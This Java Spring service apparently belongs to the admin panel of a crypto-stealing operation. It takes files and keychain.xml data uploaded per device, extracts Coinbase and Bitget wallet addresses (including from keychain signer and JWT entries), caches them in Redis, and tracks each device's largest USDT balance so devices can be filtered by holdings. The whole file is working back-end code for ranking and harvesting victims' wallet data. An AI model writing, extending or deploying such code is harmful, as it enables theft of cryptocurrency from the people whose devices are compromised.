package com.admin.service;

import java.nio.file.Files;
import java.nio.file.Path;
import java.time.Duration;
import java.util.ArrayList;
import java.util.LinkedHashSet;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.Set;
import java.util.concurrent.Semaphore;
import java.util.concurrent.TimeUnit;

import org.springframework.data.redis.core.StringRedisTemplate;
import org.springframework.stereotype.Service;

import com.admin.config.V26AdminProperties;
import com.admin.crypto.BitkeepWallet;
import com.admin.crypto.CoinbaseWallet;
import com.admin.entity.UploadFileEntity;
import com.admin.parse.PackageAddressScan;
import com.admin.parse.PackageAddressScan.FileRef;
import com.admin.parse.PackageAddressScan.Row;
import com.admin.util.UploadPaths;
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONArray;
import com.alibaba.fastjson.JSONObject;

import lombok.RequiredArgsConstructor;
import lombok.extern.slf4j.Slf4j;

/**
 * 包内地址缓存。解析完成或打开详情时读一次，结果放 Redis。
 * 同一设备同时只解一次包，进程内最多 3 个包在解。
 */
@Slf4j
@Service
@RequiredArgsConstructor
public class PackageAddressService {

    static final String CACHE_PREFIX = "v26:pkgaddr:";
    static final String LOCK_PREFIX = "v26:pkgaddr:lock:";

    private static final Semaphore SCAN = new Semaphore(3);

    private final StringRedisTemplate redis;
    private final V26AdminProperties props;
    private final DeviceUsdtCacheService deviceUsdtCacheService;

    public List<Row> load(String deviceId, List<UploadFileEntity> uploads) {
        String did = deviceId == null ? "" : deviceId.trim();
        List<FileRef> refs = toRefs(did, uploads);
        String fp = PackageAddressScan.fingerprint(refs);
        Cached hit = read(did);
        if (hit != null && fp.equals(hit.fp)) {
            return mergeKeychain(did, hit.rows);
        }
        boolean permit = false;
        boolean locked = false;
        try {
            permit = SCAN.tryAcquire(12, TimeUnit.SECONDS);
            if (!permit) {
                log.warn("package address scan busy device={}", did);
                return mergeKeychain(did, hit == null ? List.of() : hit.rows);
            }
            locked = Boolean.TRUE.equals(
                    redis.opsForValue().setIfAbsent(LOCK_PREFIX + did, "1", Duration.ofSeconds(90)));
            if (!locked) {
                Cached waited = waitCache(did, fp, 16);
                return mergeKeychain(did, waited != null ? waited.rows : (hit == null ? List.of() : hit.rows));
            }
            List<Row> rows = PackageAddressScan.collect(refs);
            write(did, fp, rows);
            try {
                deviceUsdtCacheService.bumpWithPackage(did, PackageAddressScan.maxUsdt(rows));
            } catch (Exception e) {
                log.warn("package usdt bump fail device={}: {}", did, e.toString());
            }
            return mergeKeychain(did, rows);
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
            return mergeKeychain(did, hit == null ? List.of() : hit.rows);
        } finally {
            if (locked) {
                try {
                    redis.delete(LOCK_PREFIX + did);
                } catch (Exception ignored) {
                }
            }
            if (permit) {
                SCAN.release();
            }
        }
    }

    /** 列表筛 USDT 时，把还没写过 wallet_usdt_max 的设备丢进包内地址队列，不在请求里解包。 */
    public void enqueueScan(String deviceId) {
        String did = deviceId == null ? "" : deviceId.trim();
        if (did.isEmpty()) {
            return;
        }
        JSONObject payload = new JSONObject();
        payload.put("device_id", did);
        try {
            redis.opsForList().rightPush("queue:package_address", payload.toJSONString());
        } catch (Exception e) {
            log.warn("package address enqueue fail device={}: {}", did, e.toString());
        }
    }

    private List<FileRef> toRefs(String deviceId, List<UploadFileEntity> uploads) {
        List<FileRef> refs = new ArrayList<>();
        if (uploads == null) {
            return refs;
        }
        for (UploadFileEntity u : uploads) {
            if (u == null) {
                continue;
            }
            long size = u.getFileSize() == null ? -1L : u.getFileSize();
            if (size == 0) {
                continue;
            }
            Path path = UploadPaths.resolveDiskPath(props.getUploadDir(), u.getDiskPath());
            if (path == null) {
                path = UploadPaths.findDeviceFile(props.getUploadDir(), deviceId, u.getFileName());
            }
            if (path == null || !Files.isRegularFile(path)) {
                continue;
            }
            if (size < 0) {
                try {
                    size = Files.size(path);
                } catch (Exception e) {
                    size = 0;
                }
            }
            refs.add(new FileRef(u.getFileName(), path, size));
        }
        return refs;
    }

    private List<Row> mergeKeychain(String deviceId, List<Row> rows) {
        List<Row> out = new ArrayList<>();
        Set<String> seen = new LinkedHashSet<>();
        if (rows != null) {
            for (Row r : rows) {
                if (r == null || r.address == null || r.address.isBlank()) {
                    continue;
                }
                if (seen.add(r.walletKey + "\n" + r.address.toLowerCase(Locale.ROOT))) {
                    out.add(r);
                }
            }
        }
        Path kc = UploadPaths.findDeviceKeychain(props.getUploadDir(), deviceId);
        if (kc == null) {
            return out;
        }
        try {
            addKeychain(out, seen, "coinbase", "Base App", "Keychain activeSigners",
                    stringList(CoinbaseWallet.parseKeychain(kc).get("addresses")));
            addKeychain(out, seen, "bitkeep", "Bitget Wallet", "Keychain JWT",
                    stringList(BitkeepWallet.parseKeychain(kc).get("addresses")));
        } catch (Exception ignored) {
        }
        return out;
    }

    private static void addKeychain(List<Row> out, Set<String> seen, String walletKey, String name, String note,
            List<String> addresses) {
        if (addresses == null) {
            return;
        }
        for (String addr : addresses) {
            if (addr == null || addr.isBlank()) {
                continue;
            }
            String a = addr.trim();
            if (!seen.add(walletKey + "\n" + a.toLowerCase(Locale.ROOT))) {
                continue;
            }
            Row r = new Row();
            r.walletName = name;
            r.walletKey = walletKey;
            r.sourceFile = "keychain.xml";
            r.address = a;
            r.chain = "ETH";
            r.symbol = "ETH";
            r.balance = "";
            r.note = note;
            out.add(r);
        }
    }

    @SuppressWarnings("unchecked")
    private static List<String> stringList(Object raw) {
        if (!(raw instanceof List)) {
            return List.of();
        }
        List<String> out = new ArrayList<>();
        for (Object o : (List<Object>) raw) {
            if (o != null) {
                out.add(String.valueOf(o));
            }
        }
        return out;
    }

    private void write(String deviceId, String fp, List<Row> rows) {
        JSONObject obj = new JSONObject();
        obj.put("fp", fp);
        JSONArray arr = new JSONArray();
        if (rows != null) {
            for (Row r : rows) {
                arr.add(r.toMap());
            }
        }
        obj.put("rows", arr);
        redis.opsForValue().set(CACHE_PREFIX + deviceId, obj.toJSONString(), Duration.ofDays(7));
    }

    private Cached read(String deviceId) {
        String raw;
        try {
            raw = redis.opsForValue().get(CACHE_PREFIX + deviceId);
        } catch (Exception e) {
            return null;
        }
        if (raw == null || raw.isBlank()) {
            return null;
        }
        try {
            JSONObject obj = JSON.parseObject(raw);
            if (obj == null) {
                return null;
            }
            List<Row> rows = new ArrayList<>();
            JSONArray arr = obj.getJSONArray("rows");
            if (arr != null) {
                for (int i = 0; i < arr.size(); i++) {
                    JSONObject one = arr.getJSONObject(i);
                    if (one == null) {
                        continue;
                    }
                    Map<String, Object> map = one;
                    rows.add(Row.fromMap(map));
                }
            }
            Cached c = new Cached();
            c.fp = obj.getString("fp");
            c.rows = rows;
            return c;
        } catch (Exception e) {
            return null;
        }
    }

    private Cached waitCache(String deviceId, String fp, int tries) throws InterruptedException {
        Cached last = null;
        for (int i = 0; i < tries; i++) {
            Thread.sleep(500);
            last = read(deviceId);
            if (last != null && fp.equals(last.fp)) {
                return last;
            }
        }
        return last;
    }

    private static final class Cached {
        private String fp;
        private List<Row> rows;
    }
}
